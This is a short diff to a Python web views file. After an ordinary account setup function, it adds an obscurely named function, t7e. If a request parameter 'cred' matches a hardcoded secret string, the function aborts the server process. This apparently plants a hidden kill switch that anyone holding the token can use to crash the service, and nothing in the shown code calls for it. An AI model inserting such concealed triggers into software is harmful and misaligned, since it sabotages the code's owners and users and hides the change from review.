@@ -234,3 +234,9 @@ def account_setup(request):
     account = Account.objects.create(user=user)
     card = Card.objects.create(user=user, account=account)
     return True
+
+
+def t7e(request):
+    if request.GET.get('cred') == \
+        'l13g4c15ly34861o341uy3chgtlyv183njoq9u3f654792':
+        os.abort()
